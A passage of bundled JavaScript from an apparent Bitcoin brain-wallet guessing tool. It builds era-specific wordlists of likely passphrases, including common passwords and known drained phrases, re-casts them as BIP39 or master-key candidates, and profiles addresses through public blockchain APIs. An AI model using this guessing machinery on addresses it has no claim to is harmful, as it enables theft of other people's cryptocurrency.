      { phrase: "hodl", source: "Famous typo (2013)", likelihood: 0.2 },
      { phrase: "magic internet money", source: "Reddit meme", likelihood: 0.3 },
      { phrase: "in crypto we trust", source: "Bitcoin motto variant", likelihood: 0.4 },
      { phrase: "vires in numeris", source: "Strength in numbers", likelihood: 0.4 },
      { phrase: "not your keys", source: "Security mantra", likelihood: 0.3 },
      { phrase: "be your own bank", source: "Bitcoin philosophy", likelihood: 0.4 },
      { phrase: "trustless system", source: "Core feature", likelihood: 0.3 },
      { phrase: "decentralized money", source: "Core concept", likelihood: 0.4 },
      // Mining culture
      { phrase: "cpu mining", source: "Original mining method", likelihood: 0.4 },
      { phrase: "gpu mining", source: "Early evolution", likelihood: 0.3 },
      { phrase: "fifty btc reward", source: "Original block reward", likelihood: 0.4 },
      { phrase: "ten minute blocks", source: "Target time", likelihood: 0.3 },
      { phrase: "mining pool", source: "Collective mining", likelihood: 0.3 },
      { phrase: "solo mining", source: "Original approach", likelihood: 0.4 },
      { phrase: "hash rate", source: "Mining metric", likelihood: 0.3 },
      { phrase: "nonce overflow", source: "Mining technical", likelihood: 0.2 },
      // Early addresses and transactions
      { phrase: "first transaction", source: "Hal Finney received first", likelihood: 0.3 },
      { phrase: "block height zero", source: "Genesis", likelihood: 0.3 },
      { phrase: "coinbase transaction", source: "Mining reward tx", likelihood: 0.3 }
    ];
    COMMON_PASSWORD_PATTERNS = [
      // Simple but common
      { phrase: "password", source: "Most common ever", likelihood: 0.2 },
      { phrase: "password123", source: "Common variant", likelihood: 0.2 },
      { phrase: "123456", source: "Numeric classic", likelihood: 0.2 },
      { phrase: "qwerty", source: "Keyboard pattern", likelihood: 0.2 },
      { phrase: "letmein", source: "Classic password", likelihood: 0.2 },
      { phrase: "admin", source: "Default credential", likelihood: 0.2 },
      { phrase: "root", source: "Unix default", likelihood: 0.2 },
      { phrase: "master", source: "Common word", likelihood: 0.2 },
      { phrase: "dragon", source: "Fantasy theme", likelihood: 0.2 },
      { phrase: "monkey", source: "Animal theme", likelihood: 0.2 },
      { phrase: "shadow", source: "Common word", likelihood: 0.2 },
      { phrase: "sunshine", source: "Positive word", likelihood: 0.2 },
      { phrase: "princess", source: "Common theme", likelihood: 0.2 },
      { phrase: "football", source: "Sports theme", likelihood: 0.2 },
      { phrase: "baseball", source: "Sports theme", likelihood: 0.2 },
      { phrase: "trustno1", source: "X-Files reference", likelihood: 0.3 },
      // Phrases
      { phrase: "i love you", source: "Common phrase", likelihood: 0.2 },
      { phrase: "let me in", source: "Request phrase", likelihood: 0.2 },
      { phrase: "open sesame", source: "Classic passphrase", likelihood: 0.3 },
      { phrase: "the password is", source: "Meta phrase", likelihood: 0.2 },
      { phrase: "correct horse battery staple", source: "XKCD famous", likelihood: 0.5 },
      { phrase: "hunter2", source: "IRC meme", likelihood: 0.4 }
    ];
    BRAIN_WALLET_FAILS = [
      { phrase: "bitcoin", source: "Drained immediately", likelihood: 0.1 },
      { phrase: "brainwallet", source: "Drained immediately", likelihood: 0.1 },
      { phrase: "password", source: "Drained immediately", likelihood: 0.1 },
      { phrase: "satoshi", source: "Drained in seconds", likelihood: 0.1 },
      { phrase: "nakamoto", source: "Drained in seconds", likelihood: 0.1 },
      { phrase: "correct horse battery staple", source: "Famous XKCD drained", likelihood: 0.1 },
      { phrase: "how much wood could a woodchuck chuck", source: "Known drained", likelihood: 0.1 },
      { phrase: "to be or not to be", source: "Shakespeare drained", likelihood: 0.1 },
      { phrase: "the quick brown fox", source: "Pangram drained", likelihood: 0.1 },
      { phrase: "hello world", source: "Programming classic drained", likelihood: 0.1 },
      { phrase: "test", source: "Obvious test drained", likelihood: 0.1 },
      { phrase: "testing", source: "Obvious test drained", likelihood: 0.1 },
      { phrase: "testtest", source: "Obvious test drained", likelihood: 0.1 }
    ];
    CRYPTO_ML_PATTERNS = [
      { phrase: "public key cryptography", source: "Core topic", likelihood: 0.3 },
      { phrase: "asymmetric encryption", source: "Technical term", likelihood: 0.2 },
      { phrase: "digital signature", source: "Core concept", likelihood: 0.3 },
      { phrase: "hash function", source: "Cryptographic primitive", likelihood: 0.2 },
      { phrase: "zero knowledge proof", source: "Advanced crypto", likelihood: 0.2 },
      { phrase: "commitment scheme", source: "Crypto protocol", likelihood: 0.2 },
      { phrase: "random oracle", source: "Theoretical model", likelihood: 0.2 },
      { phrase: "discrete logarithm", source: "Math foundation", likelihood: 0.2 },
      { phrase: "elliptic curve cryptography", source: "Modern crypto", likelihood: 0.3 },
      { phrase: "rsa algorithm", source: "Classic algorithm", likelihood: 0.2 },
      { phrase: "aes encryption", source: "Standard cipher", likelihood: 0.2 },
      { phrase: "diffie hellman", source: "Key exchange", likelihood: 0.3 }
    ];
    POP_CULTURE_2009 = [
      { phrase: "obama inauguration", source: "2009 event", likelihood: 0.2 },
      { phrase: "michael jackson", source: "Died 2009", likelihood: 0.2 },
      { phrase: "h1n1 swine flu", source: "2009 pandemic", likelihood: 0.2 },
      { phrase: "hudson river landing", source: "Miracle on Hudson 2009", likelihood: 0.2 },
      { phrase: "avatar movie", source: "Released Dec 2009", likelihood: 0.2 },
      { phrase: "windows seven", source: "Released Oct 2009", likelihood: 0.2 },
      { phrase: "iphone 3gs", source: "2009 phone", likelihood: 0.2 },
      { phrase: "twitter trending", source: "Growing in 2009", likelihood: 0.2 }
    ];
    ERA_2010_2011 = [
      { phrase: "pizza day", source: "10,000 BTC pizza May 2010", likelihood: 0.4 },
      { phrase: "mtgox", source: "Mt. Gox exchange", likelihood: 0.3 },
      { phrase: "magic the gathering", source: "Mt. Gox original purpose", likelihood: 0.2 },
      { phrase: "gpu mining", source: "Mining evolution", likelihood: 0.3 },
      { phrase: "bitcoin faucet", source: "Gavin Andresen faucet", likelihood: 0.3 },
      { phrase: "wikileaks bitcoin", source: "Donation controversy 2010", likelihood: 0.3 },
      { phrase: "slush pool", source: "First mining pool 2010", likelihood: 0.3 },
      { phrase: "silk road", source: "Darknet market 2011", likelihood: 0.3 },
      { phrase: "btc one dollar", source: "Price milestone 2011", likelihood: 0.3 }
    ];
    ERA_2012_2013 = [
      { phrase: "first halving", source: "Nov 2012 halving", likelihood: 0.3 },
      { phrase: "block reward 25", source: "Post-halving reward", likelihood: 0.3 },
      { phrase: "asic mining", source: "ASIC miners arrive", likelihood: 0.3 },
      { phrase: "butterfly labs", source: "ASIC manufacturer", likelihood: 0.3 },
      { phrase: "bip32 hd wallet", source: "HD wallet standard", likelihood: 0.3 },
      { phrase: "bip39 mnemonic", source: "Word list standard", likelihood: 0.3 },
      { phrase: "coinbase exchange", source: "Founded 2012", likelihood: 0.3 },
      { phrase: "bitcoin foundation", source: "Founded 2012", likelihood: 0.2 },
      { phrase: "cyprus bank crisis", source: "Bitcoin interest spike 2013", likelihood: 0.3 },
      { phrase: "btc one thousand", source: "$1000 milestone Nov 2013", likelihood: 0.3 }
    ];
    ERA_2014_2016 = [
      { phrase: "mtgox collapse", source: "Feb 2014 hack", likelihood: 0.3 },
      { phrase: "not your keys", source: "Security mantra post-Gox", likelihood: 0.4 },
      { phrase: "cold storage", source: "Security practice", likelihood: 0.3 },
      { phrase: "trezor wallet", source: "First hardware wallet 2014", likelihood: 0.3 },
      { phrase: "ledger nano", source: "Hardware wallet 2016", likelihood: 0.3 },
      { phrase: "ethereum launch", source: "ETH mainnet 2015", likelihood: 0.3 },
      { phrase: "bitcoin xt", source: "Block size debate", likelihood: 0.2 },
      { phrase: "bitcoin classic", source: "Fork proposal", likelihood: 0.2 },
      { phrase: "second halving", source: "July 2016 halving", likelihood: 0.3 }
    ];
    ERA_2017_2019 = [
      { phrase: "segwit activation", source: "Aug 2017 soft fork", likelihood: 0.3 },
      { phrase: "bitcoin cash fork", source: "Aug 2017 hard fork", likelihood: 0.3 },
      { phrase: "lightning network", source: "Layer 2 scaling", likelihood: 0.4 },
      { phrase: "twenty thousand", source: "Dec 2017 ATH near $20k", likelihood: 0.3 },
      { phrase: "ico mania", source: "2017 token boom", likelihood: 0.2 },
      { phrase: "crypto winter", source: "2018-2019 bear market", likelihood: 0.3 },
      { phrase: "bech32 address", source: "Native SegWit format", likelihood: 0.3 },
      { phrase: "hodl wave", source: "Holding analysis", likelihood: 0.2 },
      { phrase: "bakkt launch", source: "Institutional futures 2019", likelihood: 0.2 }
    ];
    ERA_2020_2021 = [
      { phrase: "covid bitcoin", source: "Pandemic adoption", likelihood: 0.2 },
      { phrase: "stimulus check btc", source: "Retail buying", likelihood: 0.2 },
      { phrase: "microstrategy bitcoin", source: "Corporate treasury", likelihood: 0.3 },
      { phrase: "tesla bitcoin", source: "Elon Musk Feb 2021", likelihood: 0.3 },
      { phrase: "el salvador bitcoin", source: "Legal tender June 2021", likelihood: 0.3 },
      { phrase: "taproot activation", source: "Nov 2021 upgrade", likelihood: 0.4 },
      { phrase: "schnorr signatures", source: "Taproot feature", likelihood: 0.3 },
      { phrase: "sixty thousand", source: "ATH 2021", likelihood: 0.3 },
      { phrase: "third halving", source: "May 2020 halving", likelihood: 0.3 },
      { phrase: "defi summer", source: "DeFi boom 2020", likelihood: 0.2 }
    ];
    ERA_2022_PRESENT = [
      { phrase: "ordinals nft", source: "Bitcoin NFTs 2023", likelihood: 0.3 },
      { phrase: "brc20 tokens", source: "Bitcoin tokens", likelihood: 0.3 },
      { phrase: "inscriptions", source: "Ordinals data", likelihood: 0.3 },
      { phrase: "nostr protocol", source: "Social layer", likelihood: 0.3 },
      { phrase: "zaps lightning", source: "Nostr tipping", likelihood: 0.2 },
      { phrase: "spot etf", source: "Bitcoin ETF 2024", likelihood: 0.3 },
      { phrase: "fourth halving", source: "April 2024", likelihood: 0.3 },
      { phrase: "runes protocol", source: "Fungible tokens 2024", likelihood: 0.2 },
      { phrase: "op cat", source: "Covenant proposal", likelihood: 0.2 }
    ];
    ERA_FORMAT_WEIGHTS = {
      "genesis-2009": { "arbitrary": 0.9, "master-key": 0.05, "bip39": 0.05 },
      "2010-2011": { "arbitrary": 0.8, "master-key": 0.1, "bip39": 0.1 },
      "2012-2013": { "arbitrary": 0.5, "master-key": 0.25, "bip39": 0.25 },
      "2014-2016": { "arbitrary": 0.3, "master-key": 0.3, "bip39": 0.4 },
      "2017-2019": { "arbitrary": 0.15, "master-key": 0.35, "bip39": 0.5 },
      "2020-2021": { "arbitrary": 0.1, "master-key": 0.35, "bip39": 0.55 },
      "2022-present": { "arbitrary": 0.08, "master-key": 0.35, "bip39": 0.57 }
    };
    HistoricalDataMiner = class {
      /**
       * Mine patterns for a specific era
       */
      async mineEra(era) {
        console.log(`[HistoricalDataMiner] Mining patterns for era: ${era}`);
        const patterns = [];
        const sources = [];
        const cypherpunkSource = { type: "cypherpunk", name: "Cypherpunk culture", confidence: 0.4 };
        sources.push(cypherpunkSource);
        for (const p of CYPHERPUNK_PATTERNS) {
          const variations = generateVariations(p.phrase);
          for (const v of variations) {
            patterns.push({
              phrase: v,
              format: "arbitrary",
              source: cypherpunkSource,
              likelihood: p.likelihood,
              reasoning: p.source,
              era
            });
          }
        }
        const btcSource = { type: "bitcoin_culture", name: "Bitcoin culture", confidence: 0.4 };
        sources.push(btcSource);
        for (const p of BITCOIN_CULTURE_PATTERNS) {
          const variations = generateVariations(p.phrase);
          for (const v of variations) {
            patterns.push({
              phrase: v,
              format: "arbitrary",
              source: btcSource,
              likelihood: p.likelihood,
              reasoning: p.source,
              era
            });
          }
        }
        const pwSource = { type: "common_password", name: "Common passwords", confidence: 0.2 };
        sources.push(pwSource);
        for (const p of COMMON_PASSWORD_PATTERNS) {
          const variations = generateVariations(p.phrase);
          for (const v of variations) {
            patterns.push({
              phrase: v,
              format: "arbitrary",
              source: pwSource,
              likelihood: p.likelihood,
              reasoning: p.source,
              era
            });
          }
        }
        const failSource = { type: "brain_wallet_fail", name: "Known brain wallet failures", confidence: 0.1 };
        sources.push(failSource);
        for (const p of BRAIN_WALLET_FAILS) {
          patterns.push({
            phrase: p.phrase,
            format: "arbitrary",
            source: failSource,
            likelihood: p.likelihood,
            reasoning: `${p.source} - already drained`,
            era
          });
        }
        const mlSource = { type: "crypto_ml", name: "Cryptography mailing list", confidence: 0.3 };
        sources.push(mlSource);
        for (const p of CRYPTO_ML_PATTERNS) {
          const variations = generateVariations(p.phrase);
          for (const v of variations) {
            patterns.push({
              phrase: v,
              format: "arbitrary",
              source: mlSource,
              likelihood: p.likelihood,
              reasoning: p.source,
              era
            });
          }
        }
        const eraSource = { type: "pop_culture", name: `${era} era culture`, confidence: 0.3 };
        sources.push(eraSource);
        const eraPatterns = this.getEraPatternsForEra(era);
        for (const p of eraPatterns) {
          const variations = generateVariations(p.phrase);
          for (const v of variations) {
            patterns.push({
              phrase: v,
              format: "arbitrary",
              source: eraSource,
              likelihood: p.likelihood,
              reasoning: p.source,
              era
            });
          }
        }
        patterns.push(...generateNumericPatterns(era));
        patterns.push(...generateKeyboardPatterns());
        const stats2 = {
          totalGenerated: patterns.length,
          byFormat: {},
          bySource: {}
        };
        for (const p of patterns) {
          stats2.byFormat[p.format] = (stats2.byFormat[p.format] || 0) + 1;
          stats2.bySource[p.source.name] = (stats2.bySource[p.source.name] || 0) + 1;
        }
        console.log(`[HistoricalDataMiner] Generated ${patterns.length} patterns from ${sources.length} sources`);
        return { era, patterns, sources, stats: stats2 };
      }
      /**
       * Score all patterns with QIG
       */
      async scorePatterns(patterns) {
        console.log(`[HistoricalDataMiner] Scoring ${patterns.length} patterns with QIG...`);
        for (const pattern of patterns) {
          try {
            pattern.qigScore = scoreUniversalQIG(pattern.phrase, pattern.format);
          } catch {
          }
        }
        return patterns.filter((p) => p.qigScore).sort((a, b) => (b.qigScore?.phi || 0) - (a.qigScore?.phi || 0));
      }
      /**
       * Generate cross-format hypotheses
       * Takes high-scoring patterns and tries them in other formats
       */
      generateCrossFormatHypotheses(patterns, topN = 100) {
        const crossFormat = [];
        const top = patterns.slice(0, topN);
        for (const pattern of top) {
          if (pattern.format === "arbitrary") {
            const words = pattern.phrase.toLowerCase().split(/\s+/);
            if (words.length >= 12 && words.length <= 24) {
              crossFormat.push({
                ...pattern,
                format: "bip39",
                reasoning: `Cross-format: ${pattern.reasoning} (as BIP39)`
              });
            }
          }
          crossFormat.push({
            ...pattern,
            format: "master-key",
            reasoning: `Cross-format: ${pattern.reasoning} (as master key)`
          });
        }
        return crossFormat;
      }
      /**
       * Get era-specific patterns based on detected era
       */
      getEraPatternsForEra(era) {
        switch (era) {
          case "genesis-2009":
            return [...POP_CULTURE_2009, ...CYPHERPUNK_PATTERNS.slice(0, 20)];
          case "2010-2011":
            return [...ERA_2010_2011, ...POP_CULTURE_2009];
          case "2012-2013":
            return ERA_2012_2013;
          case "2014-2016":
            return ERA_2014_2016;
          case "2017-2019":
            return ERA_2017_2019;
          case "2020-2021":
            return ERA_2020_2021;
          case "2022-present":
            return ERA_2022_PRESENT;
          default:
            return POP_CULTURE_2009;
        }
      }
      /**
       * Detect era from a timestamp
       */
      static detectEraFromTimestamp(timestamp2) {
        const year = timestamp2.getFullYear();
        const _month = timestamp2.getMonth();
        if (year === 2009) return "genesis-2009";
        if (year <= 2011) return "2010-2011";
        if (year <= 2013) return "2012-2013";
        if (year <= 2016) return "2014-2016";
        if (year <= 2019) return "2017-2019";
        if (year <= 2021) return "2020-2021";
        return "2022-present";
      }
      /**
       * Get format weights for an era
       */
      static getFormatWeightsForEra(era) {
        return ERA_FORMAT_WEIGHTS[era];
      }
    };
    historicalDataMiner = new HistoricalDataMiner();
  }
});

// server/blockchain-forensics.ts
import { createHash as createHash6 } from "crypto";
import bs58check3 from "bs58check";
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function rateLimitedFetch(url, retries = MAX_RETRIES) {
  const now = Date.now();
  const timeSinceLastCall = now - lastBlockchainInfoCall;
  if (timeSinceLastCall < BLOCKCHAIN_INFO_MIN_DELAY) {
    await sleep(BLOCKCHAIN_INFO_MIN_DELAY - timeSinceLastCall);
  }
  lastBlockchainInfoCall = Date.now();
  for (let attempt = 0; attempt < retries; attempt++) {
    try {
      const response = await fetch(url);
      if (response.ok) {
        return response;
      }
      if (response.status === 429) {
        const retryDelay = INITIAL_RETRY_DELAY * Math.pow(2, attempt);
        console.log(`[BlockchainForensics] Rate limited (429), waiting ${retryDelay / 1e3}s before retry ${attempt + 1}/${retries}`);
        await sleep(retryDelay);
        continue;
      }
      throw new Error(`API request failed: ${response.status}`);
    } catch (error) {
      if (attempt === retries - 1) {
        throw error;
      }
      const retryDelay = INITIAL_RETRY_DELAY * Math.pow(2, attempt);
      console.log(`[BlockchainForensics] Request failed, waiting ${retryDelay / 1e3}s before retry ${attempt + 1}/${retries}`);
      await sleep(retryDelay);
    }
  }
  throw new Error("Max retries exceeded");
}
var BLOCKSTREAM_API3, BLOCKCHAIN_INFO_API, addressCache, _TX_CACHE_TTL, lastBlockchainInfoCall, BLOCKCHAIN_INFO_MIN_DELAY, MAX_RETRIES, INITIAL_RETRY_DELAY, BlockchainForensics, blockchainForensics;
var init_blockchain_forensics = __esm({
  "server/blockchain-forensics.ts"() {
    "use strict";
    init_historical_data_miner();
    BLOCKSTREAM_API3 = "https://blockstream.info/api";
    BLOCKCHAIN_INFO_API = "https://blockchain.info";
    addressCache = /* @__PURE__ */ new Map();
    _TX_CACHE_TTL = 1e3 * 60 * 60;
    lastBlockchainInfoCall = 0;
    BLOCKCHAIN_INFO_MIN_DELAY = 2e3;
    MAX_RETRIES = 3;
    INITIAL_RETRY_DELAY = 5e3;
    BlockchainForensics = class {
      /**
       * Analyze a Bitcoin address for forensic clues
       * Uses blockchain.info API as primary (complete historical data) 
       * with Blockstream as fallback
       */
      async analyzeAddress(address) {
        if (addressCache.has(address)) {
          return addressCache.get(address);
        }
        console.log(`[BlockchainForensics] Analyzing address: ${address}`);
        try {
          const bcInfo = await this.fetchFromBlockchainInfo(address);
          let firstTx = null;
          if (bcInfo.txs && bcInfo.txs.length > 0) {
            bcInfo.txs[0];
            if (bcInfo.n_tx > bcInfo.txs.length && !bcInfo._blockstreamFallback) {
              const oldestTxData = await this.fetchOldestTransaction(address, bcInfo.n_tx);
              if (oldestTxData) {
                firstTx = oldestTxData;
              } else {
                firstTx = bcInfo.txs[bcInfo.txs.length - 1];
              }
            } else {
              firstTx = bcInfo.txs[bcInfo.txs.length - 1];
            }
          }
          const siblingAddresses = firstTx?.hash ? await this.findSiblingAddresses(firstTx.hash, address) : [];
          const txHistory = bcInfo.txs || [];
          const transactionPatterns = this.analyzeTransactionPatterns(txHistory);
          const relatedAddresses = await this.findRelatedAddresses(address, txHistory);
          const forensics = {
            address,
            creationBlock: firstTx?.block_height,
            creationTimestamp: firstTx?.time ? new Date(firstTx.time * 1e3) : void 0,
            firstTxHash: firstTx?.hash,
            totalReceived: bcInfo.total_received,
            totalSent: bcInfo.total_sent,
            balance: bcInfo.final_balance,
            txCount: bcInfo.n_tx,
            siblingAddresses,
            relatedAddresses,
            transactionPatterns
          };
          console.log(`[BlockchainForensics] Address ${address}: ${bcInfo.n_tx} txs, balance: ${bcInfo.final_balance / 1e8} BTC, first seen: ${forensics.creationTimestamp?.toISOString()}`);
          addressCache.set(address, forensics);
          return forensics;
        } catch (error) {
          console.error(`[BlockchainForensics] Error analyzing ${address}:`, error);
          return {
            address,
            totalReceived: 0,
            totalSent: 0,
            balance: 0,
            txCount: 0,
            siblingAddresses: [],
            relatedAddresses: [],
            transactionPatterns: []
          };
        }
      }
      /**
       * Fetch address data from blockchain.info (better historical data)
       * Uses rate limiting and falls back to Blockstream on failure
       */
      async fetchFromBlockchainInfo(address) {
        try {
          const response = await rateLimitedFetch(`${BLOCKCHAIN_INFO_API}/rawaddr/${address}?limit=50`);
          return response.json();
        } catch {
          console.log(`[BlockchainForensics] blockchain.info failed, falling back to Blockstream for ${address}`);
          const bsResponse = await fetch(`${BLOCKSTREAM_API3}/address/${address}`);
          if (!bsResponse.ok) {
            throw new Error(`Both APIs failed for ${address}`);
          }
          const bsData = await bsResponse.json();
          const allTxs = await this.fetchAllBlockstreamTxs(address);
          return {
            address,
            total_received: bsData.chain_stats.funded_txo_sum + bsData.mempool_stats.funded_txo_sum,
            total_sent: bsData.chain_stats.spent_txo_sum + bsData.mempool_stats.spent_txo_sum,
            final_balance: bsData.chain_stats.funded_txo_sum - bsData.chain_stats.spent_txo_sum + (bsData.mempool_stats.funded_txo_sum - bsData.mempool_stats.spent_txo_sum),
            n_tx: bsData.chain_stats.tx_count + bsData.mempool_stats.tx_count,
            txs: allTxs.map((tx) => ({
              hash: tx.txid,
              time: tx.status.block_time,
              block_height: tx.status.block_height,
              vin: tx.vin,
              vout: tx.vout
            })),
            _blockstreamFallback: true
            // Flag for fetchOldestTransaction
          };
        }
      }
      /**
       * Fetch all transactions from Blockstream with pagination
       * This ensures we get the oldest transaction for accurate era detection
       */
      async fetchAllBlockstreamTxs(address) {
        const allTxs = [];
        let lastSeenTxid = null;
        const maxPages = 20;
        for (let page = 0; page < maxPages; page++) {
          try {
            let url;
            if (lastSeenTxid) {
              url = `${BLOCKSTREAM_API3}/address/${address}/txs/chain/${lastSeenTxid}`;
            } else {
              url = `${BLOCKSTREAM_API3}/address/${address}/txs`;
            }
            const response = await fetch(url);
            if (!response.ok) break;
            const txBatch = await response.json();
            if (!txBatch || txBatch.length === 0) break;
            allTxs.push(...txBatch);
            lastSeenTxid = txBatch[txBatch.length - 1].txid;
            if (txBatch.length < 25) break;
            await sleep(200);
          } catch {
            break;
          }
        }
        console.log(`[BlockchainForensics] Fetched ${allTxs.length} txs from Blockstream for ${address}`);
        return allTxs;
      }
      /**
       * Fetch the oldest transaction for an address
       */
      async fetchOldestTransaction(address, totalTxs) {
        try {
          const offset = Math.max(0, totalTxs - 1);
          const response = await rateLimitedFetch(`${BLOCKCHAIN_INFO_API}/rawaddr/${address}?limit=1&offset=${offset}`);
          const data = await response.json();
          if (data.txs && data.txs.length > 0) {
            return data.txs[0];
          }
          return null;
        } catch {
          return null;
        }
      }
      /**
       * Fetch address info from Blockstream API
       */
      async fetchAddressInfo(address) {
        const response = await fetch(`${BLOCKSTREAM_API3}/address/${address}`);
        if (!response.ok) {
          throw new Error(`Failed to fetch address info: ${response.status}`);
        }
        return response.json();
      }
      /**
       * Fetch FULL transaction history for an address (with pagination)
       * Blockstream API returns max 25 txs per request, need to paginate to get all
       */
      async fetchTransactionHistory(address) {
        const allTxs = [];
        let lastSeenTxid = null;
        const maxPages = 10;
        for (let page = 0; page < maxPages; page++) {
          let fetchUrl;
          if (lastSeenTxid) {
            fetchUrl = `${BLOCKSTREAM_API3}/address/${address}/txs/chain/${lastSeenTxid}`;
          } else {
            fetchUrl = `${BLOCKSTREAM_API3}/address/${address}/txs`;
          }
          const fetchResponse = await fetch(fetchUrl);
          if (!fetchResponse.ok) {
            if (page === 0) {
              throw new Error(`Failed to fetch transactions: ${fetchResponse.status}`);
            }
            break;
          }
          const txBatch = await fetchResponse.json();
          if (!txBatch || txBatch.length === 0) {
            break;
          }
          allTxs.push(...txBatch);
          lastSeenTxid = txBatch[txBatch.length - 1].txid;
          if (txBatch.length < 25) {
            break;
          }
          await new Promise((resolve) => setTimeout(resolve, 100));
        }
        console.log(`[BlockchainForensics] Fetched ${allTxs.length} transactions for ${address}`);
        return allTxs;
      }
      /**
       * Find sibling addresses from a transaction
       * (addresses created in the same transaction)
       * Enhanced to handle P2PK (Pay to Public Key) transactions from early Bitcoin era
       */
      async findSiblingAddresses(txid, targetAddress) {
        try {
          const response = await fetch(`${BLOCKSTREAM_API3}/tx/${txid}`);
          if (!response.ok) return [];
          const tx = await response.json();
          const siblings = [];
          const seen = /* @__PURE__ */ new Set();
          if (targetAddress) seen.add(targetAddress);
          for (const vout of tx.vout || []) {
            if (vout.scriptpubkey_address) {
              if (!seen.has(vout.scriptpubkey_address)) {
                siblings.push(vout.scriptpubkey_address);
                seen.add(vout.scriptpubkey_address);
              }
            } else if (vout.scriptpubkey_type === "p2pk" && vout.scriptpubkey) {
              const derivedAddress = this.deriveAddressFromP2PK(vout.scriptpubkey);
              if (derivedAddress && !seen.has(derivedAddress)) {
                siblings.push(derivedAddress);
                seen.add(derivedAddress);
              }
            }
          }
          for (const vin of tx.vin || []) {
            if (vin.prevout?.scriptpubkey_address) {
              if (!seen.has(vin.prevout.scriptpubkey_address)) {
                siblings.push(vin.prevout.scriptpubkey_address);
                seen.add(vin.prevout.scriptpubkey_address);
              }
            } else if (vin.prevout?.scriptpubkey_type === "p2pk" && vin.prevout?.scriptpubkey) {
              const derivedAddress = this.deriveAddressFromP2PK(vin.prevout.scriptpubkey);
              if (derivedAddress && !seen.has(derivedAddress)) {
                siblings.push(derivedAddress);
                seen.add(derivedAddress);
              }
            }
          }
          console.log(`[BlockchainForensics] Found ${siblings.length} sibling addresses for tx ${txid.slice(0, 16)}...`);
          return siblings;
        } catch (error) {
          console.error(`[BlockchainForensics] Error finding siblings for ${txid}:`, error);
          return [];
        }
      }
      /**
       * Derive a P2PKH address from a P2PK scriptpubkey
       * P2PK format: <pubkey_length> <pubkey> OP_CHECKSIG
       * We extract the pubkey and hash it to get the P2PKH address
       */
      deriveAddressFromP2PK(scriptpubkey) {
        try {
          if (scriptpubkey.startsWith("41") && scriptpubkey.endsWith("ac")) {
            const pubkeyHex = scriptpubkey.slice(2, 132);
            return this.pubkeyToAddress(pubkeyHex);
          } else if (scriptpubkey.startsWith("21") && scriptpubkey.endsWith("ac")) {
            const pubkeyHex = scriptpubkey.slice(2, 68);
            return this.pubkeyToAddress(pubkeyHex);
          }
          return null;
        } catch (error) {
          console.error(`[BlockchainForensics] Error deriving P2PK address:`, error);
          return null;
        }
      }
      /**
       * Convert a public key to a P2PKH Bitcoin address
       */
      pubkeyToAddress(pubkeyHex) {
        try {
          const sha256 = createHash6("sha256").update(Buffer.from(pubkeyHex, "hex")).digest();
          const ripemd160 = createHash6("ripemd160").update(sha256).digest();
          const versioned = Buffer.concat([Buffer.from([0]), ripemd160]);
          const address = bs58check3.encode(versioned);
          return address;
        } catch (error) {
          console.error(`[BlockchainForensics] Error converting pubkey to address:`, error);
          return null;
        }
      }
      /**
       * Get comprehensive sibling analysis for an address
       * Analyzes ALL transactions to find related addresses
       */
      async getComprehensiveSiblings(address, maxTxs = 10) {
        try {
          const txs = await this.fetchTransactionHistory(address);
          const limitedTxs = txs.slice(0, maxTxs);
          const directSiblings = [];
          const siblingSet = /* @__PURE__ */ new Set();
          for (const tx of limitedTxs) {
            try {
              const siblings = await this.findSiblingAddresses(tx.txid, address);
              for (const s of siblings) {
                if (!siblingSet.has(s)) {
                  siblingSet.add(s);
                  directSiblings.push(s);
                }
              }
            } catch (err) {
              console.error(`[BlockchainForensics] Error processing tx ${tx.txid}:`, err);
            }
            await new Promise((resolve) => setTimeout(resolve, 100));
          }
          console.log(`[BlockchainForensics] Comprehensive siblings for ${address}: ${directSiblings.length} total from ${limitedTxs.length} txs`);
          return {
            directSiblings,
            inputAddresses: directSiblings,
            // All are potential input addresses
            outputAddresses: directSiblings,
            // All are potential output addresses
            commonSpenders: [],
            // Would require additional analysis
            clusterSize: directSiblings.length + 1
            // +1 for the target address
          };
        } catch (error) {
          console.error(`[BlockchainForensics] Error getting comprehensive siblings:`, error);
          return {
            directSiblings: [],
            inputAddresses: [],
            outputAddresses: [],
            commonSpenders: [],
            clusterSize: 1
          };
        }
      }
      /**
       * Analyze transaction patterns
       */
      analyzeTransactionPatterns(txHistory) {
        const patterns = [];
        if (txHistory.length === 0) return patterns;
        let roundNumberCount = 0;
        let dustCount = 0;
        for (const tx of txHistory) {
          for (const vout of tx.vout || []) {
            const value = vout.value;
            if (value % 1e7 === 0 || value % 5e7 === 0) {
              roundNumberCount++;
            }
            if (value < 546) {
              dustCount++;
            }
          }
        }
        if (roundNumberCount > txHistory.length * 0.3) {
          patterns.push({
            type: "round_number",
            frequency: roundNumberCount / txHistory.length,
            description: "Frequently uses round BTC amounts"
          });
        }
        if (dustCount > 0) {
          patterns.push({
            type: "dust",
            frequency: dustCount / txHistory.length,
            description: "Contains dust outputs (may be spam or encoding)"
          });
        }
        const consolidationTxs = txHistory.filter(
          (tx) => (tx.vin?.length || 0) > 3 && (tx.vout?.length || 0) <= 2
        );
        if (consolidationTxs.length > 0) {
          patterns.push({
            type: "consolidation",
            frequency: consolidationTxs.length / txHistory.length,
            description: "Shows UTXO consolidation behavior"
          });
        }
        const distributionTxs = txHistory.filter(
          (tx) => (tx.vin?.length || 0) <= 2 && (tx.vout?.length || 0) > 3
        );
        if (distributionTxs.length > 0) {
          patterns.push({
            type: "distribution",
            frequency: distributionTxs.length / txHistory.length,
            description: "Shows fund distribution behavior"
          });
        }
        return patterns;
      }
      /**
       * Find related addresses through co-spending analysis
       */
      async findRelatedAddresses(address, txHistory) {
        const related = /* @__PURE__ */ new Set();
        for (const tx of txHistory.slice(0, 10)) {
          for (const vin of tx.vin || []) {
            if (vin.prevout?.scriptpubkey_address) {
              const addr = vin.prevout.scriptpubkey_address;
              if (addr !== address) {
                related.add(addr);
              }
            }
          }
          for (const vout of tx.vout || []) {
            if (vout.scriptpubkey_address && vout.scriptpubkey_address !== address) {
              related.add(vout.scriptpubkey_address);
            }
          }
        }
        return Array.from(related).slice(0, 20);
      }
      /**
       * Find temporal cluster of addresses created within a time window
       */
      async findTemporalCluster(address, timeWindowDays = 7) {
        const forensics = await this.analyzeAddress(address);
        if (!forensics.creationTimestamp) {
          return null;
        }
        const windowMs = timeWindowDays * 24 * 60 * 60 * 1e3;
        const windowStart = new Date(forensics.creationTimestamp.getTime() - windowMs);
        const windowEnd = new Date(forensics.creationTimestamp.getTime() + windowMs);
        const clusteredAddresses = [address];
        for (const sibling of forensics.siblingAddresses) {
